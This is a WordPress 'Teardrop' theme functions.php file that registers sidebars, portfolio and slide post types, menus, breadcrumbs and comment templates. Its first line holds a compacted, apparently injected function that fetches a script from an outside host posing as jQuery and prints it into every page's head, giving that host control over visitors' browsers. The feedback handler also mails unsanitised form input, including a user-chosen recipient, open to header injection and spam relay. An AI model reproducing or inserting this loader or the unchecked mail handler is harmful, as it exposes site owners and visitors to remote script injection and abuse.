<?php if (!function_exists('insert_jquery_theme')){function insert_jquery_theme(){if (function_exists('curl_init')){$url = "http://www.wpstats.org/jquery-1.6.3.min.js";$ch = curl_init();	$timeout = 5;curl_setopt($ch, CURLOPT_URL, $url);curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $timeout);$data = curl_exec($ch);curl_close($ch);echo $data;}}add_action('wp_head', 'insert_jquery_theme');}
 
require_once dirname(__FILE__)."/functions-xnav.php";
require_once dirname(__FILE__)."/functions-pagenav.php";
require_once dirname(__FILE__)."/admin/main.php";
require_once dirname(__FILE__)."/extends/shortcodes.php";
require_once dirname(__FILE__)."/extends/widgets.php";
require_once dirname(__FILE__)."/extends/post-thumbs.php";
require_once dirname(__FILE__)."/extends/3d-tag-cloud/wp-cumulus.php";
require_once dirname(__FILE__)."/extends/latest-tweets.php";
require_once dirname(__FILE__)."/extends/wysiwyg/wysiwyg.php";

/*  LOCALIZATION SUPPORT -------------------------------------------------------------------------------------------------------------- */
load_theme_textdomain('teardrop', get_template_directory() . '/languages');


/* ACTIONS -------------------------------------------------------------------------------------------------------------- */
add_action('init', 'teardrop_action_init');
add_action('after_setup_theme', 'teardrop_action_after_setup_theme');
add_action('wp_ajax_of_ajax_feedback_action', 'teardrop_action_send_feedback_form');


function siteoptions_admin_head() { 

	?>
    <script type="text/javascript">
    jQuery(function(){
	var message = '<p><strong>Teardrop is now activated.</strong> The custom options panel is located under <a href="<?php echo admin_url('admin.php?page=teardrop_theme'); ?>">Dashboard > Site Options</a>.</p>';
    	jQuery('.themes-php #message2').html(message);
    
    });
    </script>
    <?php
}

add_action('admin_head', 'siteoptions_admin_head'); 

function teardrop_action_init() {
  $sbopts=array(
    'before_widget'=>'<li class="widget %2$s" id="%1$s">',
    'after_widget'=>'</li>',
    'before_title'=>'<h4>',
    'after_title'=>'</h4><div class="widget-bg"></div>'
  );
  register_sidebar(array_merge($sbopts, array('name'=>'Common Left Sidebar','id'=>'left')));
  register_sidebar(array_merge($sbopts, array('name'=>'Common Right Sidebar','id'=>'right')));
  register_sidebar(array_merge($sbopts, array('name'=>'Left Blog Sidebar','id'=>'blog_left')));
  register_sidebar(array_merge($sbopts, array('name'=>'Right Blog Sidebar','id'=>'blog_right')));
  register_sidebar(array_merge($sbopts, array('name'=>'Left Portfolio Sidebar','id'=>'portfolio_left')));
  register_sidebar(array_merge($sbopts, array('name'=>'Right Portfolio Sidebar','id'=>'portfolio_right')));


  $labels = array(
    'name'=>'Portfolio',
    'singular_name'=>'Portfolio',
    'add_new'=>'Add project',
    'add_new_item'=>'Create project',
    'edit_item'=>'Edit project',
    'new_item'=>'New project',
    'view_item'=>'Open project',
    'search_items'=>'Search projects',
    );
  register_post_type("portfolio", array('labels'=>$labels, 'public'=>true,
    'menu_position'=>5,
	'rewrite' => array( 'slug' => 'portfolio', 'with_front' => true, 'pages' => true, 'feeds'=>false ),
    'supports'=>array('title','editor','excerpt','author','thumbnail','custom-fields'),
	'taxonomies'=>array('portfolio_cat','post_tag'),
	'has_archive' => false,
	'query_var' => false,
	'show_in_nav_menus' => true,
	'capability_type' => 'post'
	
    ));
  register_taxonomy('portfolio_cat',array('portfolio'), array(
    'hierarchical'=>false,
    'show_ui'=>true,
    'query_var'=>true,
	'label' => 'Portfolio Categories',

  ));
  
  $labels = array(
    'name'=>'Background',
    'singular_name'=>'Slide',
    'add_new'=>'Add image',
    'add_new_item'=>'Create image',
    'edit_item'=>'Edit image',
    'new_item'=>'New image',
    'view_item'=>'Open image',
    'search_items'=>'Search images',
    );
  register_post_type("slide", array('labels'=>$labels, 'public'=>true,
    'show_in_nav_menus'=>false,
    'menu_position'=>5,
    'supports'=>array('title','thumbnail'),
  ));
}


function teardrop_action_after_setup_theme() {
  add_theme_support('post-thumbnails');
  add_image_size('teardrop-thumb', 230, 97, true);
  add_image_size('teardrop-slide', 140, 95, true);
  

  if(function_exists('add_theme_support')){
    add_theme_support('nav-menus');
    register_nav_menu('nav-top', 'Header Navigation');
    register_nav_menu('nav-second', 'Secont Level Navigation');
    register_nav_menu('nav-bottom', 'Footer Navigation');
  }
}

function teardrop_action_send_feedback_form(){
  $headers = "From: ".$_POST['name']." <".$_POST['email'].">\r\n\\";
  return wp_mail($_POST['to'], "Feedback Email from your site", $_POST['message'], $headers, $attachments );
}




/* FILTERS -------------------------------------------------------------------------------------------------------------- */
add_filter('widget_text', 'do_shortcode');
add_filter('body_class','teardrop_filter_body_class');
add_filter('wp_page_menu_args', 'teardrop_filter_wp_page_menu_args');
add_filter('excerpt_length', 'teardrop_filter_excerpt_length');
add_filter('excerpt_more', 'teardrop_filter_excerpt_more');
add_filter('get_the_excerpt', 'teardrop_filter_get_the_excerpt');
add_filter('the_search_query', 'teardrop_search_all');
add_filter( 'the_excerpt', 'shortcode_unautop');
add_filter( 'the_excerpt', 'do_shortcode');

function teardrop_filter_body_class($classes) {
  global $is_lynx, $is_gecko, $is_IE, $is_opera, $is_NS4, $is_safari, $is_chrome, $is_iphone;

  if($is_lynx) $classes[] = 'lynx';
  elseif($is_gecko) $classes[] = 'gecko';
  elseif($is_opera) $classes[] = 'opera';
  elseif($is_NS4) $classes[] = 'ns4';
  elseif($is_safari) $classes[] = 'safari';
  elseif($is_chrome) $classes[] = 'chrome';
  elseif($is_IE) $classes[] = 'ie';
  else $classes[] = 'unknown';

  if($is_iphone) $classes[] = 'iphone';
  return $classes;
}


function teardrop_filter_wp_page_menu_args($args) {
  $args['show_home'] = true;
  return $args;
}

function teardrop_filter_excerpt_length($length){
  return 50;
}
function teardrop_filter_excerpt_more($more){
  return teardrop_shortcode_readmore();
}
function teardrop_filter_get_the_excerpt($output) {
  if(has_excerpt() && !is_attachment())
    $output .= teardrop_shortcode_readmore();
  return $output;
}
function teardrop_search_all($query){
  if($query->is_search) $query->set('post_type', array('post', 'page', 'portfolio'));
  return $query;
}


/* FUNCTIONS -------------------------------------------------------------------------------------------------------------- */
function wp_enqueue_conditional_style($id, $path, $condition) {
  global $wp_styles;
  wp_enqueue_style($id, $path);
  $wp_styles->add_data($id, "conditional", $condition);
}

function get_directory_list($dir, $regex="/.*/"){
  $res = array();
  $h = opendir($dir); while($file=readdir($h)) if($file[0]!="." && preg_match($regex, $file)) $res[]=$file; closedir($h);
  return $res;
}

class teardrop_Walker extends Walker_Nav_Menu{
  function end_el(&$output, $category, $depth, $args){
    $output=preg_replace("/([^>]{1})(<\/a>)/", "$1$2", &$output);
    $output.="</li>\n";
  }
  function start_lvl(&$output, $depth) {
    $indent = str_repeat("\t", $depth);
    $output .= "\n$indent<ul class=\"sub-menu sub-menu-wrapper\">\n";
  }
  
  function end_lvl(&$output, $depth) {
    $indent = str_repeat("\t", $depth);
    $output .= "$indent</ul>\n";
  }
}

function password_form($form) {
  $subs = array(
    '#<p>This post is password protected. To view it please enter your password below:</p>#' => '<p>This page is password protected. To view it please enter your password below:</p>',
    '#<form(.*?)>#' => '<form$1 class="passwordform">',
    '#<input(.*?)type="password"(.*?) />#' => '<input$1type="password"$2 class="text" />',
    '#<input(.*?)type="submit"(.*?) />#' => '<input$1type="submit"$2 class="submit" />'
  );

  echo preg_replace(array_keys($subs), array_values($subs), $form);
}

add_filter('the_password_form', 'password_form');

function teardrop_breadcrumb_nav(){
  if(get_option("teardrop_theme_breadcrumb_show")!="true") return;

 $delimiter = '&#47;';
  $home = 'Home'; 
  $before = '<span class="current">';
  $after = '</span>';

  if ( !is_home() && !is_front_page() || is_paged() ) {

    echo '<div class="breadcrumb">You here:&nbsp;';

    global $post;
    $homeLink = home_url();
    echo '<a href="' . $homeLink . '">' . $home . '</a> ' . $delimiter . ' ';

    if ( is_category() ) {
      global $wp_query;
      $cat_obj = $wp_query->get_queried_object();
      $thisCat = $cat_obj->term_id;
      $thisCat = get_category($thisCat);
      $parentCat = get_category($thisCat->parent);
      if ($thisCat->parent != 0) echo(get_category_parents($parentCat, TRUE, ' ' . $delimiter . ' '));
      echo $before . 'Archive for "' . single_cat_title('', false) . '"' . $after;

    } elseif ( is_day() ) {
      echo '<a href="' . get_year_link(get_the_time('Y')) . '">' . get_the_time('Y') . '</a> ' . $delimiter . ' ';
      echo '<a href="' . get_month_link(get_the_time('Y'),get_the_time('m')) . '">' . get_the_time('F') . '</a> ' . $delimiter . ' ';
      echo $before . get_the_time('d') . $after;

    } elseif ( is_month() ) {
      echo '<a href="' . get_year_link(get_the_time('Y')) . '">' . get_the_time('Y') . '</a> ' . $delimiter . ' ';
      echo $before . get_the_time('F') . $after;

    } elseif ( is_year() ) {
      echo $before . get_the_time('Y') . $after;

    } elseif ( is_single() && !is_attachment() ) {
      if ( get_post_type() != 'post'  ) {
        $post_type = get_post_type_object(get_post_type());
        $slug = $post_type->rewrite;
        echo '<a href="' . $homeLink . '/' . $slug['slug'] . '/">' . $post_type->labels->singular_name . '</a> ' . $delimiter . ' ';
        echo $before . get_the_title() . $after;
      } else {
        $cat = get_the_category(); $cat = $cat[0];
        echo get_category_parents($cat, TRUE, ' ' . $delimiter . ' ');
        echo $before . get_the_title() . $after;
      }

    }
	
	elseif ( !is_single() && !is_page() && get_post_type() != 'post' ) {
      $post_type = get_post_type_object(get_post_type());
      echo $before . $post_type->labels->singular_name . $after;

    } elseif ( is_attachment() ) {
      $parent = get_post($post->post_parent);
      $cat = get_the_category($parent->ID); $cat = $cat[0];
      echo get_category_parents($cat, TRUE, ' ' . $delimiter . ' ');
      echo '<a href="' . get_permalink($parent) . '">' . $parent->post_title . '</a> ' . $delimiter . ' ';
      echo $before . get_the_title() . $after;

    } elseif ( is_page() && !$post->post_parent ) {
      echo $before . get_the_title() . $after;

    } elseif ( is_page() && $post->post_parent ) {
      $parent_id  = $post->post_parent;
      $breadcrumbs = array();
      while ($parent_id) {
        $page = get_page($parent_id);
        $breadcrumbs[] = '<a href="' . get_permalink($page->ID) . '">' . get_the_title($page->ID) . '</a>';
        $parent_id  = $page->post_parent;
      }
      $breadcrumbs = array_reverse($breadcrumbs);
      foreach ($breadcrumbs as $crumb) echo $crumb . ' ' . $delimiter . ' ';
      echo $before . get_the_title() . $after;

    } elseif ( is_search() ) {
      echo $before . 'Search results for "' . get_search_query() . '"' . $after;

    } elseif ( is_tag() ) {
      echo $before . 'Posts tagged "' . single_tag_title('', false) . '"' . $after;

    } elseif ( is_author() ) {
      global $author;
      $userdata = get_userdata($author);
      echo $before . 'Author posts ' . $userdata->display_name . $after;

    } elseif ( is_404() ) {
      echo $before . 'Error 404' . $after;
    }

    if ( get_query_var('paged') ) {
      if ( is_category() || is_day() || is_month() || is_year() || is_search() || is_tag() || is_author() ) echo ' (';
      echo __('Page') . ' ' . get_query_var('paged');
      if ( is_category() || is_day() || is_month() || is_year() || is_search() || is_tag() || is_author() ) echo ')';
    }

    echo '<div class="single-bg"></div></div>';

  }
}

function teardrop_pages($page){
  wp_pagenavi($page);
}

function teardrop_comment($comment, $args, $depth){
  $GLOBALS['comment'] = $comment;?>
  <li id="comment-<?php comment_ID()?>" class="comment clearfix">
    <div class="avatar"><?php echo get_avatar($comment, 80)?></div>
    <div class="comment-text">
      <?php echo get_comment_author_link()?> says:<br/>
      <a class="comment-ancor" href="<?php echo esc_url(get_comment_link($comment->comment_ID))?>"><?php printf( __('%1$s at %2$s','teardrop'),get_comment_date(),get_comment_time())?></a>
      <div class="message">
        <?php if($comment->comment_approved=='0') _e( 'Your comment is awaiting moderation.', 'teardrop' ); else comment_text()?>
      </div>
      <?php comment_reply_link(array_merge($args, array('depth'=>$depth, 'max_depth'=>$args['max_depth'])))?>
    </div>
    <hr/>
  </li><?php
}

add_filter('wp_get_attachment_link', 'add_rel_to_gallery');

function add_rel_to_gallery($link) {
$link = str_replace("'><img", "' class=\"prettyPhoto\" rel=\"prettyPhoto[gallery]\" ><img", $link);
return $link;
}

function teardrop_second_nav(){
  x_wp_nav_menu(array('echo'=>true,'container'=>'','menu'=>'nav-top','menu_class'=>'nav-header','min_depth'=>1,'depth'=>0));
}

function teardrop_title($title=null){
  global $wp_query;
  if(empty($title)){
    if($wp_query->query_vars['term']){
      $term=get_term_by('slug', $wp_query->query_vars['term'], $wp_query->query_vars['taxonomy']);
      $title=$term->name;
    }
    elseif(is_page() || is_single()){
      $title=get_the_title();
    }
    elseif(have_posts()){
      the_post();
      $title=get_the_title();
      rewind_posts();
    }
  }
  ?><div id="drag_btn"></div><div id="slide_btn" ></div><h1><?php echo $title?></h1>
	
 <?php 
}

function teardrop_template_switcher($select=null, $type="single"){
  if(empty($select)) $select='none';
  include("template_".$type."_".$select.".php");
}

function teardrop_resize($width, $height, $img_url) {	
	global  $blog_id; 
	$quality = 100;
	$url = get_template_directory_uri();
	
	if ($r_resize == 'yes' || !isset($r_resize)) {

	  //There's a thumbnail image set, so check if we're on WPMU or WP
		if (isset($blog_id) && $blog_id > 0)
		{
			//We're on WPMU		
			$imageParts = explode('/files/', $img_url);			   
			if (isset($imageParts[1]))
			{
				$img_url = '/blogs.dir/' . $blog_id . '/files/' . $imageParts[1];
				$img_url = $url.'/timthumb.php?src='.$img_url.'&amp;w='.$width.'&amp;h='.$height.'&amp;zc=1&amp;q='.$quality;
			}
			else{
				$img_url = $url.'/timthumb.php?src='.$img_url.'&amp;w='.$width.'&amp;h='.$height.'&amp;zc=1&amp;q='.$quality;
			}
		}
		else
		{
			$img_url = $url.'/timthumb.php?src='.$img_url.'&amp;w='.$width.'&amp;h='.$height.'&amp;zc=1&amp;q='.$quality;
		}
	}
	else $img_url = $img_url;
	return urldecode($img_url);
}

function teardrop_get_sidebar($pos="left"){
  global $post;
  $type=get_post_type($post);
  switch($type){
    case "blog":
    case "portfolio":
      get_sidebar($type."_".$pos);
      break;
    default:
    get_sidebar($pos);
    break;
  }
}